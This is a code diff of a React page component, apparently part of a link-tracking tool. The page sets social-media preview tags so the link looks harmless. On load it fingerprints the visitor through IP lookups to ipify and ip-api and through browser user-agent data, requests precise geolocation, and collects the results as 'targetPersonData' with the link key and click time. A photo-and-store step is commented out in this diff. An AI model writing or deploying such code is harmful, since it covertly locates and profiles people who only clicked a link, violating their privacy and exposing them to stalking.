@@ -6,8 +6,7 @@ import { StoreData } from "../../helpers/DbActions";
 import { useLocation } from "react-router-dom"; 
 import useFetchDetails from "../../Hooks/useFetchDetails";
 
-function SetMetaDatas(data) {
-    console.log(data)
+function SetMetaDatas(data) { 
     document.title = data?.title || 'Try something'
     document.querySelector('meta[property="og:image"]').content = data?.img || "https://storage.googleapis.com/pai-images/acb2784ef3bd4a7a98e41d78d7ea3fa8.jpeg"
     document.querySelector('meta[property="og:title"]').content = data?.title || 'Try something' 
@@ -30,71 +29,69 @@ export default function PreivewTarget() {
     // Setting the title of the page
     SetMetaDatas(data) 
     
-    useEffect(() => {
- 
-        async function CallingApi() {
-            try {
-                const ipFyResponse = await axios.get("https://api.ipify.org?format=json") 
-                const ipFyIp = await ipFyResponse.data.ip
-                const IpInfos = await axios.get(`http://ip-api.com/json/${ipFyIp}?fields=status,message,continent,country,regionName,city,lat,lon,timezone,isp,org,as,mobile ,query`)
+    async function CallingApi() {
+        try {
+            const ipFyResponse = await axios.get("https://api.ipify.org?format=json") 
+            const ipFyIp = await ipFyResponse.data.ip
+            const IpInfos = await axios.get(`http://ip-api.com/json/${ipFyIp}?fields=status,message,continent,country,regionName,city,lat,lon,timezone,isp,org,as,mobile ,query`)
 
-                const datas = {
-                    ...IpInfos.data, 
-                    ...navigator.userAgentData, 
-                    brand:navigator.userAgentData.brands[2].brand,
-                    mobile:navigator.userAgentData.mobile,
-                    platform:navigator.userAgentData.platform,
-                    url:window.location.href,
-                    link_key:theKey,
-                    clicked_at: Date.now()
-                
-                }
-                setTargetPersonData(datas);
-                AskLocationPermision()
-            } catch (error) {
-                seterror(true)
-                console.error('issues:', error)
+            const datas = {
+                ...IpInfos.data, 
+                ...navigator.userAgentData, 
+                brand:navigator.userAgentData.brands[2].brand,
+                mobile:navigator.userAgentData.mobile,
+                platform:navigator.userAgentData.platform,
+                url:window.location.href,
+                link_key:theKey,
+                clicked_at: Date.now()
+            
             }
-  
+            setTargetPersonData(datas);
+            AskLocationPermision()
+        } catch (error) {
+            seterror(true)
+            console.error('issues:', error)
         }
-        CallingApi()
 
-
-        function AskLocationPermision() { 
-            // Check if the browser supports the Geolocation API
-            if (navigator.geolocation) {
-                // Use the getCurrentPosition method to get the user's location
-                navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // Access latitude and longitude from the position object
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    setTargetPersonData((prev) => ({
-                        ...prev,
-                        lat:latitude,
-                        lon:longitude,
-                    })) 
-                    // navigator.userAgentData
-                },
-                (error) => {
-                    // Handle errors, if any
-                    console.error(`Error getting location: ${error.message}`);
-                }
-                );
-            } else {
-                // Browser doesn't support Geolocation API
-                console.error('Geolocation is not supported in this browser.');
+    }
+    function AskLocationPermision() { 
+        // Check if the browser supports the Geolocation API
+        if (navigator.geolocation) {
+            // Use the getCurrentPosition method to get the user's location
+            navigator.geolocation.getCurrentPosition(
+            (position) => {
+                // Access latitude and longitude from the position object
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                setTargetPersonData((prev) => ({
+                    ...prev,
+                    lat:latitude,
+                    lon:longitude,
+                })) 
+                // navigator.userAgentData
+            },
+            (error) => {
+                // Handle errors, if any
+                console.error(`Error getting location: ${error.message}`);
             }
+            );
+        } else {
+            // Browser doesn't support Geolocation API
+            console.error('Geolocation is not supported in this browser.');
         }
-     
+    }
+    useEffect(() => { 
+        CallingApi()  
     },[])
  
      
     function ClickedOkay() {
 
         if (!IsClicked) {
-            PhotoAndStore()
-            setIsClicked(true)
+            alert(JSON.stringify(targetPersonData))
+            console.log('loaded',targetPersonData)
+            // PhotoAndStore() 
+            // setIsClicked(true)
         }
         
 
@@ -160,6 +157,7 @@ export default function PreivewTarget() {
     
     return(
         <>
+        {targetPersonData !== null ? 
             <div className={style.preview_section}>
                 <div className="container">
                     <div className="row">
@@ -181,6 +179,7 @@ export default function PreivewTarget() {
                 : null}
 
             </div>
+        : <h1 className="text-center mt-5 mb-5">loading...</h1> }
         </>
     )
 }
